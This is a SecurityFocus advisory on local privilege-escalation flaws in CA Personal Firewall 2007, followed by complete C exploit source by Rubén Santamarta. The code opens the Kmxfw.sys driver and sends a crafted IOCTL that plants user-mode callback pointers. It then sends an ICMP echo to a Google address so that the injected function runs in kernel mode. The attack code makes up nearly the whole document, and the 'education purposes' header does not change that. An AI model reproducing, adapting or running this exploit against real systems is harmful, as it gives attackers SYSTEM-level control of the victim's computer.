source: http://www.securityfocus.com/bid/21140/info

Multiple Computer Associates security-related products are prone to multiple local privilege-escalation vulnerabilities.

An attacker can leverage these issues to execute arbitrary code with SYSTEM-level privileges. This could result in the complete compromise of vulnerable computers.

These isses affect CA Personal Firewall 2007 (v9.0) Engine version 1.0.173 and prior and CA Internet Security Suite 2007 version 3.0 with CA Personal Firewall 2007 version 9.0 Engine version 1.0.173 and prior.

////////////////////////////////////
///// CA HIPS Engine Drivers
////////////////////////////////////
//// Kmxfw.sys
//// Kernel Privilege Escalation #2
//// Exploit
//// Rub?n Santamarta 
//// www.reversemode.com
//// 15/10/2006
//// ONLY FOR EDUCATION PURPOSES
//// NO MODIFICATION ALLOWED.
////////////////////////////////////
/////////////////////
/// Compiling:
/// gcc exploit.c -o exploit -lwsock32
/////////////////////


#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <iphlpapi.h>


typedef HANDLE (WINAPI *PIcmpCreateFile)();
typedef DWORD (WINAPI *PIcmpSendEcho2)(   HANDLE IcmpHandle,
                                          HANDLE Event,
                                          FARPROC ApcRoutine,
                                          PVOID ApcContext,
                                          IPAddr DestinationAddress,
                                          LPVOID RequestData,
                                          WORD RequestSize,
                                          PIP_OPTION_INFORMATION RequestOptions,
                                          LPVOID ReplyBuffer,
                                          DWORD ReplySize,
                                          DWORD Timeout);

VOID Ring0Function()
{

 printf("\n");
 printf("-----[RING0]------");
 printf("\n");
 printf("[*] Message: [.oO Hello From Ring0! Oo.]\n");
 printf("[!] Exploit Terminated\n");
 printf("-----[RING0]------");
 Sleep(50000);
}

VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,"Error",0);
 exit(1);
}

int main(int argc, char *argv[])
{

 DWORD				*OutBuff,*InBuff;
 DWORD              CallBacks[4];			
 DWORD				dwIOCTL,OutSize,InSize,junk,i,dwRetVal;
 HANDLE				hDevice;
 PIcmpSendEcho2     IcmpSendEcho2;
 PIcmpCreateFile    IcmpCreateFile;
 LPVOID             ReplyBuffer;
 HANDLE             hIcmpFile;
 char               *SendData = "owned!";


  
 if(argc<2)
 {
  printf("\nusage> exploit.exe  2K or XP\n");
  exit(1);
 }

 if(!strcmp(argv[1],"2K")) 
 {
  IcmpSendEcho2 = (PIcmpSendEcho2)GetProcAddress(LoadLibrary("icmp.dll")
													,"IcmpSendEcho2");
  IcmpCreateFile = (PIcmpCreateFile)GetProcAddress(LoadLibrary("icmp.dll")
                                                  ,"IcmpCreateFile");
 }                          
 else                        
{
  IcmpSendEcho2 = (PIcmpSendEcho2)GetProcAddress(LoadLibrary("iphlpapi.dll")
													,"IcmpSendEcho2");
  IcmpCreateFile = (PIcmpCreateFile)GetProcAddress(LoadLibrary("iphlpapi.dll")
                                                 ,"IcmpCreateFile");
}
 
system("cls");
printf("############################\n");
printf("### CA Personal Firewall ###\n");
printf("##### - Ring0 Exploit - ####\n");
printf("############################\n");
printf("Ruben Santamarta\nwww.reversemode.com\n\n");
//////////////////////
///// CASE 'DosDevice'
//////////////////////

hDevice = CreateFile("\\\\.\\Kmxfw",
                     0,
                     0,
                     NULL,
                     3,
                     0,
                     0);

//////////////////////
///// INFO 
//////////////////////

 if (hDevice == INVALID_HANDLE_VALUE) ShowError();
 printf("[!] Kmxfw Device Handle [%x]\n",hDevice);
 
//////////////////////
///// BUFFERS
//////////////////////
 OutSize = 0x44;

 OutBuff = (DWORD *)malloc(OutSize);
 //////////////////////
 ///// IOCTL
 //////////////////////

 dwIOCTL = 0x85000014;
 printf("[!] Injecting Malicious Callback\n",dwIOCTL);
 CallBacks[0]=0;
 CallBacks[1]=(DWORD)Ring0Function;
 CallBacks[2]=0;
 
 OutBuff[0]=(DWORD)CallBacks;
 OutBuff[1]=(DWORD)CallBacks;
 OutBuff[2]=(DWORD)CallBacks;
 
 
 DeviceIoControl(hDevice, 
                 dwIOCTL, 
                 (LPVOID)OutBuff,0x10,
                 (LPVOID)OutBuff,0x44,
                 &junk,  
                 NULL);
 
 printf("[!] Pinging google\n\t->Executing Ring0 Function\n");
 hIcmpFile=IcmpCreateFile();
 ReplyBuffer = (VOID*) malloc(sizeof(ICMP_ECHO_REPLY) + sizeof(SendData));
 IcmpSendEcho2(hIcmpFile,
                    NULL,
                    NULL,
                    NULL,
                    inet_addr("66.102.9.99"), 
                    SendData, 
                    sizeof(SendData),
                    NULL,
                    ReplyBuffer, 
                    8*sizeof(SendData) + sizeof(ICMP_ECHO_REPLY),
                    1000);

 
}